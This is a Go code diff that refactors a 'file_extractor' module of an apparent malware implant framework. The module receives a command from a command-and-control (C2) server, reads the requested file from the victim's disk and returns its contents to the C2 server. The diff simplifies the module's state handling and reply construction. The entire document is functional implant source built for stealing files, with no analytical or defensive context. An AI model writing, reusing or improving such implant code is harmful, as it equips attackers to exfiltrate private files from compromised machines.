@@ -6,21 +6,22 @@ import (
 	"malware/common/types"
 )
 
-type state struct {
-	running bool
-}
+/**
+
+Most basic module
+Reads a file from disk and returns it to C2
+
+*/
 
 type settings struct {
-	state *state // Tell our loop to stop
 }
 
 // Create creates an implementation of settings
 func Create() types.Module {
-	state := state{running: false}
-	return settings{&state}
+	return settings{}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
 	file := message.GetGetfile()
 	if file == nil {
 		return false
@@ -28,20 +29,18 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 
 	out, err := ioutil.ReadFile(file.Filename)
 	if err != nil {
-		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_FILE_NOT_FOUND})
+		callback(messages.Implant_error(settings.ID(), types.ERR_FILE_NOT_FOUND))
 	} else {
-		callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
+		callback(messages.Implant_data(settings.ID(), out))
 	}
 	return true
 }
 
-// Init the state of this module
+// This module has no init/shutdown needs
 func (settings settings) Init() {
-	settings.state.running = true
 }
 
 func (settings settings) Shutdown() {
-	settings.state.running = false
 }
 
 func (settings) ID() string { return "file_extractor" }
